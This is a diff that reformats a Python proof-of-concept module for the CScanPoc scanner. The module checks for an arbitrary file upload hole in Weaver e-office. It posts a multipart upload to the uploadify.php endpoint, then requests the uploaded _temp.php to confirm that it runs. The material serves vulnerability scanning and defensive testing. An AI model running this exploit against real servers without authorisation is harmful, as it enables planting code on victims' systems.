@@ -2,13 +2,15 @@
 
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
-import time, re
+import time
+import re
+
 
 class Vuln(ABVuln):
-    vuln_id = 'weaver_0034' # 平台漏洞编号，留空
+    vuln_id = 'weaver_0034'  # 平台漏洞编号，留空
     name = '泛微e-office 任意文件上传'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_UPLOAD # 漏洞类型
+    type = VulnType.FILE_UPLOAD  # 漏洞类型
     disclosure_date = '2015-07-11'  # 漏洞公布时间
     desc = '''
         泛微e-cology 存在任意文件上传漏洞。
@@ -19,6 +21,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '泛微OA'  # 漏洞应用名称
     product_version = '泛微e-office'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'e2c3dd18-b872-4a2f-b682-a293e9c2497b'
@@ -32,8 +35,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #refer: http://www.wooyun.org/bugs/wooyun-2015-0125592
+
+            # refer: http://www.wooyun.org/bugs/wooyun-2015-0125592
             hh = hackhttp.hackhttp()
             arg = self.target
             content_type = 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVO9PKsatIjWx0zBn'
@@ -47,11 +50,13 @@ class Poc(ABPoc):
                 ------WebKitFormBoundaryVO9PKsatIjWx0zBn--
             '''
             url = arg + '/general/weibo/javascript/uploadify/uploadify.php'
-            code, head, res, err, _ = hh.http(url, header=content_type, post=post)
-            
+            code, head, res, err, _ = hh.http(
+                url, header=content_type, post=post)
+
             if code == 200:
-                code, head, res, err, _ = hh.http(arg + 'attachment/personal/_temp.php')
-                if (code==200) and (md5_1 in res):
+                code, head, res, err, _ = hh.http(
+                    arg + 'attachment/personal/_temp.php')
+                if (code == 200) and (md5_1 in res):
                     #security_hole('Arbitrarily file upload: ' + url)
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
@@ -61,6 +66,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
